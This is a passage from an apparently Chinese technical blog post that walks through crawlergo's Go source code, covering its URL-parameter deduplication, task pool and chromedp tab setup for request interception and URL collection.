&#123;<br>set.Add(value)<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 如果参数值为空，统计该PATH下的空值参数名个数</span><br><span class="hljs-keyword">if</span> value == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">if</span> _, ok := s.filterPathParamEmptyValues.Load(pathId); !ok &#123;<br>s.filterPathParamEmptyValues.Store(pathId, mapset.NewSet(key))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> v, ok := s.filterPathParamEmptyValues.Load(pathId); ok &#123;<br>set := v.(mapset.Set)<br><span class="hljs-keyword">if</span> !set.Contains(key) &#123;<br>set.Add(key)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br>pathIdKey := pathId + key<br><span class="hljs-comment">// 某path下的参数值去重标记出现次数统计</span><br><span class="hljs-keyword">if</span> v, ok := s.filterPathParamKeySymbol.Load(pathIdKey); ok &#123;<br><span class="hljs-keyword">if</span> markedStringRegex.MatchString(value.(<span class="hljs-type">string</span>)) &#123;<br>s.filterPathParamKeySymbol.Store(pathIdKey, v.(<span class="hljs-type">int</span>)+<span class="hljs-number">1</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>s.filterPathParamKeySymbol.Store(pathIdKey, <span class="hljs-number">1</span>)<br>&#125;<br><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 相对于上一级目录，本级path目录的数量统计，存在文件后缀的情况下，放行常见脚本后缀</span><br><span class="hljs-keyword">if</span> req.URL.ParentPath() == <span class="hljs-string">&quot;&quot;</span> || inCommonScriptSuffix(req.URL.FileExt()) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">//</span><br>parentPathId := tools.StrMd5(req.URL.ParentPath())<br>currentPath := strings.Replace(req.Filter.MarkedPath, req.URL.ParentPath(), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">-1</span>)<br><span class="hljs-keyword">if</span> _, ok := s.filterParentPathValues.Load(parentPathId); !ok &#123;<br>s.filterParentPathValues.Store(parentPathId, mapset.NewSet(currentPath))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> v, ok := s.filterParentPathValues.Load(parentPathId); ok &#123;<br>set := v.(mapset.Set)<br><span class="hljs-keyword">if</span> !set.Contains(currentPath) &#123;<br>set.Add(currentPath)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Post 类型的也进行打标记和 Get 的类型：</p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240327111535900.png?imageSlim" alt="image-20240327111535900" style="zoom:67%;" /><p>打完标记后会根据 <code>req.Filter.UniqueId</code> 进行去重</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 全局数值型参数标记</span><br>s.globalFilterLocationMark(req)<br><br><span class="hljs-comment">// 接下来对标记的 GET 请求进行去重</span><br><span class="hljs-keyword">if</span> req.Method == config.GET || req.Method == config.DELETE || req.Method == config.HEAD || req.Method == config.OPTIONS &#123;<br>    <span class="hljs-comment">// 对超过阈值的GET请求进行标记</span><br>    s.overCountMark(req)<br><br>    <span class="hljs-comment">// 重新计算 QueryMapId</span><br>    req.Filter.QueryMapId = getParamMapID(req.Filter.MarkedQueryMap)<br>    <span class="hljs-comment">// 重新计算 PathId</span><br>    req.Filter.PathId = getPathID(req.Filter.MarkedPath)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 重新计算 PostDataId</span><br>    req.Filter.PostDataId = getParamMapID(req.Filter.MarkedPostDataMap)<br>&#125;<br></code></pre></td></tr></table></figure><p>overCountMark 这里就是对参数、路径部分超过最大阈值的去打一个最大标记</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> overCountMark(req *model.Request) &#123;<br>queryKeyId := req.Filter.QueryKeysId<br>pathId := req.Filter.PathId<br><span class="hljs-comment">// 参数不为空，</span><br><span class="hljs-keyword">if</span> req.Filter.QueryKeysId != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-comment">// 某个URL的所有参数名重复数量超过阈值 且该参数有超过三个不同的值 则打标记</span><br><span class="hljs-keyword">if</span> v, ok := s.filterParamKeyRepeatCount.Load(queryKeyId); ok &amp;&amp; v.(<span class="hljs-type">int</span>) &gt; MaxParamKeySingleCount &#123;<br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> req.Filter.MarkedQueryMap &#123;<br>paramQueryKey := queryKeyId + key<br><span class="hljs-keyword">if</span> set, ok := s.filterParamKeySingleValues.Load(paramQueryKey); ok &#123;<br>set := set.(mapset.Set)<br><span class="hljs-comment">// 3 个打标记 &#123;&#123;fix_param&#125;&#125;</span><br><span class="hljs-keyword">if</span> set.Cardinality() &gt; <span class="hljs-number">3</span> &#123;<br>req.Filter.MarkedQueryMap[key] = FixParamRepeatMark<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> req.Filter.MarkedQueryMap &#123;<br><span class="hljs-comment">// 所有URL中，某个参数不同的值出现次数超过阈值，打标记去重</span><br><span class="hljs-keyword">if</span> paramKeySet, ok := s.filterParamKeyAllValues.Load(key); ok &#123;<br>paramKeySet := paramKeySet.(mapset.Set)<br><span class="hljs-keyword">if</span> paramKeySet.Cardinality() &gt; MaxParamKeyAllCount &#123;<br>req.Filter.MarkedQueryMap[key] = FixParamRepeatMark<br>&#125;<br>&#125;<br><br>pathIdKey := pathId + key<br><span class="hljs-comment">// 某个PATH的GET参数值去重标记出现次数超过阈值，则对该PATH的该参数进行全局标记</span><br><span class="hljs-keyword">if</span> v, ok := s.filterPathParamKeySymbol.Load(pathIdKey); ok &amp;&amp; v.(<span class="hljs-type">int</span>) &gt; MaxPathParamKeySymbolCount &#123;<br>req.Filter.MarkedQueryMap[key] = FixParamRepeatMark<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 处理某个path下空参数值的参数个数超过阈值 如伪静态： http://bang.360.cn/?chu_xiu</span><br><span class="hljs-keyword">if</span> v, ok := s.filterPathParamEmptyValues.Load(pathId); ok &#123;<br>set := v.(mapset.Set)<br><span class="hljs-keyword">if</span> set.Cardinality() &gt; MaxPathParamEmptyCount &#123;<br>newMarkerQueryMap := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;&#125;<br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> req.Filter.MarkedQueryMap &#123;<br><span class="hljs-keyword">if</span> value == <span class="hljs-string">&quot;&quot;</span> &#123;<br>newMarkerQueryMap[FixParamRepeatMark] = <span class="hljs-string">&quot;&quot;</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>newMarkerQueryMap[key] = value<br>&#125;<br>&#125;<br>req.Filter.MarkedQueryMap = newMarkerQueryMap<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 处理本级 path 的伪静态</span><br><span class="hljs-keyword">if</span> req.URL.ParentPath() == <span class="hljs-string">&quot;&quot;</span> || inCommonScriptSuffix(req.URL.FileExt()) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>parentPathId := tools.StrMd5(req.URL.ParentPath())<br><span class="hljs-keyword">if</span> set, ok := s.filterParentPathValues.Load(parentPathId); ok &#123;<br>set := set.(mapset.Set)<br><span class="hljs-keyword">if</span> set.Cardinality() &gt; MaxParentPathCount &#123;<br><span class="hljs-keyword">if</span> strings.HasSuffix(req.URL.ParentPath(), <span class="hljs-string">&quot;/&quot;</span>) &#123;<br>req.Filter.MarkedPath = req.URL.ParentPath() + FixPathMark<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>req.Filter.MarkedPath = req.URL.ParentPath() + <span class="hljs-string">&quot;/&quot;</span> + FixPathMark<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>处理过超过阈值的部分后会再进行一次打标记，这个时候路径、参数会经过改变，所以会进行再一轮打标记：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 接下来对标记的 GET 请求进行去重</span><br><span class="hljs-keyword">if</span> req.Method == config.GET || req.Method == config.DELETE || req.Method == config.HEAD || req.Method == config.OPTIONS &#123;<br>    <span class="hljs-comment">// 对超过阈值的GET请求进行标记</span><br>    s.overCountMark(req)<br><br>    <span class="hljs-comment">// 重新计算 QueryMapId</span><br>    req.Filter.QueryMapId = getParamMapID(req.Filter.MarkedQueryMap)<br>    <span class="hljs-comment">// 重新计算 PathId</span><br>    req.Filter.PathId = getPathID(req.Filter.MarkedPath)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 重新计算 PostDataId</span><br>    req.Filter.PostDataId = getParamMapID(req.Filter.MarkedPostDataMap)<br>&#125;<br><br><span class="hljs-comment">// 重新计算请求唯一ID</span><br>req.Filter.UniqueId = getMarkedUniqueID(req)<br></code></pre></td></tr></table></figure><p>然后就是使用新的标记 ID 进行去重处理了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">req.Filter.UniqueId = getMarkedUniqueID(req)<br><br><span class="hljs-comment">// 新的ID再次去重</span><br>newUniqueId := req.Filter.UniqueId<br><span class="hljs-keyword">if</span> s.uniqueMarkedIds.Contains(newUniqueId) &#123;<br>    logger.Logger.Debugf(<span class="hljs-string">&quot;filter req by uniqueMarkedIds 2: &quot;</span> + req.URL.RequestURI())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">// 添加到结果集中</span><br>s.uniqueMarkedIds.Add(newUniqueId)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>到这里 crawlergo 的去重部分就完了，它是通过对参数进行打标记进行的去重处理：</p><p>简单一下就是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://url/abc?<span class="hljs-built_in">id</span>=1<br>http://url/abc?<span class="hljs-built_in">id</span>=2<br>http://url/abc?<span class="hljs-built_in">id</span>=3<br></code></pre></td></tr></table></figure><p>这些会被打标机为：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">http://url/abc?id=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">number</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这样就做到了去重。</p><p>过滤之后，会把请求添加到 initTasks 列表中，然后就开始爬行任务了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> initTasks &#123;<br>    <span class="hljs-keyword">if</span> !engine2.IsIgnoredByKeywordMatch(*req, t.Config.IgnoreKeywords) &#123;<br>        t.addTask2Pool(req)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>IsIgnoredByKeywordMatch 用来判断该请求是否是需要忽略掉的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsIgnoredByKeywordMatch</span><span class="hljs-params">(req model2.Request, IgnoreKeywords []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, _str := <span class="hljs-keyword">range</span> IgnoreKeywords &#123;<br><span class="hljs-keyword">if</span> strings.Contains(req.URL.String(), _str) &#123;<br>logger.Logger.Info(<span class="hljs-string">&quot;ignore request: &quot;</span>, req.SimpleFormat())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是爬行部分：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *CrawlerTask)</span></span> addTask2Pool(req *model.Request) &#123;<br>t.taskCountLock.Lock()<br><span class="hljs-comment">// 爬行数量</span><br><span class="hljs-keyword">if</span> t.crawledCount &gt;= t.Config.MaxCrawlCount &#123;<br>t.taskCountLock.Unlock()<br><span class="hljs-keyword">return</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>t.crawledCount += <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-comment">// 超时</span><br><span class="hljs-keyword">if</span> t.Start.Add(time.Second * time.Duration(t.Config.MaxRunTime)).Before(time.Now()) &#123;<br>t.taskCountLock.Unlock()<br><span class="hljs-keyword">return</span><br>&#125;<br>t.taskCountLock.Unlock()<br><br>t.taskWG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-comment">// 根据请求生成协程任务</span><br>task := t.generateTabTask(req)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 这里使用了 ants 去控制协程 执行的是 task.Task() 去做爬行的具体逻辑</span><br>err := t.Pool.Submit(task.Task)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>t.taskWG.Done()<br>logger.Logger.Error(<span class="hljs-string">&quot;addTask2Pool &quot;</span>, err)<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p>generateTabTask 就是封装了一下这个请求：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *CrawlerTask)</span></span> generateTabTask(req *model.Request) *tabTask &#123;<br>task := tabTask&#123;<br>crawlerTask: t,<br>browser:     t.Browser,<br>req:         req,<br>&#125;<br><span class="hljs-keyword">return</span> &amp;task<br>&#125;<br></code></pre></td></tr></table></figure><p>具体的爬行任务就是在 Task() 这里了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *tabTask)</span></span> Task() &#123;<br><span class="hljs-keyword">defer</span> t.crawlerTask.taskWG.Done()<br><br><span class="hljs-comment">// 设置tab超时时间，若设置了程序最大运行时间， tab超时时间和程序剩余时间取小</span><br>timeremaining := t.crawlerTask.Start.Add(time.Duration(t.crawlerTask.Config.MaxRunTime) * time.Second).Sub(time.Now())<br>tabTime := t.crawlerTask.Config.TabRunTimeout<br><span class="hljs-keyword">if</span> t.crawlerTask.Config.TabRunTimeout &gt; timeremaining &#123;<br>tabTime = timeremaining<br>&#125;<br><br><span class="hljs-keyword">if</span> tabTime &lt;= <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 创建一个标签页</span><br>tab := engine2.NewTab(t.browser, *t.req, engine2.TabConfig&#123;<br>TabRunTimeout:           tabTime,<br>DomContentLoadedTimeout: t.crawlerTask.Config.DomContentLoadedTimeout,<br>EventTriggerMode:        t.crawlerTask.Config.EventTriggerMode,<br>EventTriggerInterval:    t.crawlerTask.Config.EventTriggerInterval,<br>BeforeExitDelay:         t.crawlerTask.Config.BeforeExitDelay,<br>EncodeURLWithCharset:    t.crawlerTask.Config.EncodeURLWithCharset,<br>IgnoreKeywords:          t.crawlerTask.Config.IgnoreKeywords,<br>CustomFormValues:        t.crawlerTask.Config.CustomFormValues,<br>CustomFormKeywordValues: t.crawlerTask.Config.CustomFormKeywordValues,<br>&#125;)<br>    <span class="hljs-comment">// 开始爬行</span><br>tab.Start()<br><br><span class="hljs-comment">// 收集结果</span><br>t.crawlerTask.Result.resultLock.Lock()<br>t.crawlerTask.Result.AllReqList = <span class="hljs-built_in">append</span>(t.crawlerTask.Result.AllReqList, tab.ResultList...)<br>t.crawlerTask.Result.resultLock.Unlock()<br><span class="hljs-comment">// 遍历收集到的结构 添加任务</span><br><span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> tab.ResultList &#123;<br><span class="hljs-keyword">if</span> !t.crawlerTask.filter.DoFilter(req) &#123;<br>t.crawlerTask.Result.resultLock.Lock()<br>t.crawlerTask.Result.ReqList = <span class="hljs-built_in">append</span>(t.crawlerTask.Result.ReqList, req)<br>t.crawlerTask.Result.resultLock.Unlock()<br><span class="hljs-keyword">if</span> !engine2.IsIgnoredByKeywordMatch(*req, t.crawlerTask.Config.IgnoreKeywords) &#123;<br>t.crawlerTask.addTask2Pool(req)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 NewTab 这里主要是设置请求拦截：</p><ol><li>js 、json 类型的使用 ParseResponseURL 收集页面中可能存在的 url</li><li>重定向处理</li><li>认证页面阻塞处理</li><li>表单填充</li><li>JS 注入</li><li>回调处理</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewTab</span><span class="hljs-params">(browser *Browser, navigateReq model2.Request, config TabConfig)</span></span> *Tab &#123;<br><span class="hljs-keyword">var</span> tab Tab<br>tab.ExtraHeaders = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;&#125;<br><span class="hljs-keyword">var</span> DOMContentLoadedRun = <span class="hljs-literal">false</span><br>tab.Ctx, tab.Cancel = browser.NewTab(config.TabRunTimeout)<br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> browser.ExtraHeaders &#123;<br>navigateReq.Headers[key] = value<br><span class="hljs-keyword">if</span> key != <span class="hljs-string">&quot;Host&quot;</span> &#123;<br>tab.ExtraHeaders[key] = value<br>&#125;<br>&#125;<br>tab.NavigateReq = navigateReq<br>tab.config = config<br>tab.DocBodyNodeId = <span class="hljs-number">0</span><br><br><span class="hljs-comment">// 设置请求拦截监听</span><br>chromedp.ListenTarget(*tab.Ctx, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(v <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">switch</span> v := v.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-comment">// 根据不同的事件 选择执行对应的动作</span><br><span class="hljs-keyword">case</span> *network.EventRequestWillBeSent:<br><span class="hljs-keyword">if</span> <span class="hljs-type">string</span>(v.RequestID) == <span class="hljs-type">string</span>(v.LoaderID) &amp;&amp; v.Type == <span class="hljs-string">&quot;Document&quot;</span> &amp;&amp; tab.TopFrameId == <span class="hljs-string">&quot;&quot;</span> &#123;<br>tab.LoaderID = <span class="hljs-type">string</span>(v.LoaderID)<br>tab.TopFrameId = <span class="hljs-type">string</span>(v.FrameID)<br>&#125;<br><br><span class="hljs-comment">// 请求发出时暂停 即 请求拦截</span><br><span class="hljs-keyword">case</span> *fetch.EventRequestPaused:<br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.InterceptRequest(v)<br><br><span class="hljs-comment">// 解析所有JS文件中的URL并添加到结果中</span><br><span class="hljs-comment">// 解析HTML文档中的URL</span><br><span class="hljs-comment">// 查找当前页面的编码</span><br><span class="hljs-keyword">case</span> *network.EventResponseReceived:<br><span class="hljs-keyword">if</span> v.Response.MimeType == <span class="hljs-string">&quot;application/javascript&quot;</span> || v.Response.MimeType == <span class="hljs-string">&quot;text/html&quot;</span> || v.Response.MimeType == <span class="hljs-string">&quot;application/json&quot;</span> &#123;<br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.ParseResponseURL(v)<br>&#125;<br><span class="hljs-keyword">if</span> v.RequestID.String() == tab.NavNetworkID &#123;<br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.GetContentCharset(v)<br>&#125;<br><span class="hljs-comment">// 处理后端重定向 3XX</span><br><span class="hljs-keyword">case</span> *network.EventResponseReceivedExtraInfo:<br><span class="hljs-keyword">if</span> v.RequestID.String() == tab.NavNetworkID &#123;<br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.HandleRedirectionResp(v)<br>&#125;<br><span class="hljs-comment">//case *network.EventLoadingFailed:</span><br><span class="hljs-comment">//logger.Logger.Error(&quot;EventLoadingFailed &quot;, v.ErrorText)</span><br><span class="hljs-comment">// 401 407 要求认证 此时会阻塞当前页面 需要处理解决</span><br><span class="hljs-keyword">case</span> *fetch.EventAuthRequired:<br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.HandleAuthRequired(v)<br><br><span class="hljs-comment">// DOMContentLoaded</span><br><span class="hljs-comment">// 开始执行表单填充 和 执行DOM节点观察函数</span><br><span class="hljs-comment">// 只执行一次</span><br><span class="hljs-keyword">case</span> *page.EventDomContentEventFired: <span class="hljs-comment">// 当 DOM 内容加载完成时触发的事件</span><br><span class="hljs-keyword">if</span> DOMContentLoadedRun &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>DOMContentLoadedRun = <span class="hljs-literal">true</span><br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.AfterDOMRun()<br><span class="hljs-comment">// Loaded</span><br><span class="hljs-keyword">case</span> *page.EventLoadEventFired: <span class="hljs-comment">// 当页面完全加载完成时触发的事件</span><br><span class="hljs-keyword">if</span> DOMContentLoadedRun &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>DOMContentLoadedRun = <span class="hljs-literal">true</span><br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.AfterDOMRun()<br><br><span class="hljs-comment">// 关闭弹窗</span><br><span class="hljs-keyword">case</span> *page.EventJavascriptDialogOpening: <span class="hljs-comment">// 当页面弹出 JavaScript 对话框时触发的事件</span><br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.dismissDialog()<br><br><span class="hljs-comment">// handle expose function</span><br><span class="hljs-keyword">case</span> *runtime.EventBindingCalled: <span class="hljs-comment">// 当页面中的绑定函数被调用时触发的事件</span><br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.HandleBindingCalled(v)<br>&#125;<br>&#125;)<br><br><span class="hljs-keyword">return</span> &amp;tab<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要看一下 URL 收集的部分：</p><p>ParseResponseURL 通过正则去从页面响应中去提取 URL：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 